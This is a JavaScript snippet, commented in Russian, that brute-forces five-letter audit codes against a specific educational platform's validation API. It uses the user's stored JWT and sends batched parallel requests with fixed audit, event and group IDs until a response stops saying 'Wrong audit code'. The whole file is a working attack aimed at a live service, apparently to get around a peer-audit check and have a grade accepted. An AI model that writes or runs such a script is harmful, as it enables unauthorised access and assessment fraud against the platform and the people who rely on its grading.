/**
 * Brute-force audit codes
 * 
 * ЗАПУСКАТЬ ТОЛЬКО В SNIPPETS (не в консоли браузера)
 * 
 * Стратегия: перебор буквенных кодов (26^5 = 11.8M вариантов)
 * Порядок: наиболее частые символы первыми
 */

const TOKEN = localStorage.getItem('hasura-jwt-token');
const BASE_URL = '/api/validation/astanahub/module/linear-stats';
const PARAMS = 'grade=1&auditId=38113&eventId=96&groupId=10232&feedback=%7B%7D';

// === Настройки ===
const CHARS = 'abcdefghijklmnopqrstuvwxyz';  // только буквы (26^5 = 11.8M)
const PROGRESS_INTERVAL = 1000;  // логировать каждые N попыток

let attempts = 0;
let found = false;
const startTime = Date.now();

// === Функции ===
function generateCodes(chars, length) {
  // Генератор кодов в порядке: позиция 4 меняется быстрее всего
  return function*() {
    const indices = new Array(length).fill(0);
    while (true) {
      let code = '';
      for (let i = 0; i < length; i++) {
        code += chars[indices[i]];
      }
      yield code;
      
      // Инкремент
      let pos = length - 1;
      while (pos >= 0) {
        indices[pos]++;
        if (indices[pos] < chars.length) break;
        indices[pos] = 0;
        pos--;
      }
      if (pos < 0) break;
    }
  };
}

async function checkCode(code) {
  try {
    const url = `${BASE_URL}?${PARAMS}&code=${encodeURIComponent(code)}`;
    const res = await fetch(url, {
      headers: { 'x-jwt-token': TOKEN }
    });
    const text = await res.text();
    
    if (!text.includes('Wrong audit code')) {
      return { success: true, code, response: text };
    }
    return { success: false };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

async function bruteForce() {
  console.log(`🚀 Starting brute-force: ${CHARS.length}^5 = ${Math.pow(CHARS.length, 5).toLocaleString()} combinations`);
  console.log(`Charset: "${CHARS}"`);
  console.log(`At ~70 req/sec: ~${Math.floor(Math.pow(CHARS.length, 5) / 70 / 3600)} hours`);
  
  const generator = generateCodes(CHARS, 5)();
  
  // Параллельные запросы (батчами по 20)
  const BATCH = 20;
  let batch = [];
  
  for (const code of generator) {
    if (found) break;
    
    batch.push(checkCode(code));
    attempts++;
    
    if (batch.length >= BATCH) {
      const results = await Promise.all(batch);
      for (const result of results) {
        if (result.success) {
          console.log(`🎉 FOUND CODE: ${result.code}`);
          console.log(`Response: ${result.response}`);
          found = true;
          break;
        }
      }
      batch = [];
      
      if (attempts % PROGRESS_INTERVAL === 0) {
        const elapsed = (Date.now() - startTime) / 1000;
        const rate = attempts / elapsed;
        const remaining = (Math.pow(CHARS.length, 5) - attempts) / rate;
        console.log(`⏳ Progress: ${attempts.toLocaleString()} | ${rate.toFixed(0)} req/s | ETA: ${Math.floor(remaining / 3600)}h ${Math.floor((remaining % 3600) / 60)}m`);
      }
    }
  }
  
  // Обработка оставшихся
  if (batch.length > 0 && !found) {
    const results = await Promise.all(batch);
    for (const result of results) {
      if (result.success) {
        console.log(`🎉 FOUND CODE: ${result.code}`);
        found = true;
        break;
      }
    }
  }
  
  if (!found) {
    console.log('❌ Code not found in charset');
  }
  
  const elapsed = (Date.now() - startTime) / 1000;
  console.log(`⏱ Total: ${elapsed.toFixed(0)}s | Attempts: ${attempts.toLocaleString()}`);
}

// Старт
bruteForce().catch(console.error);
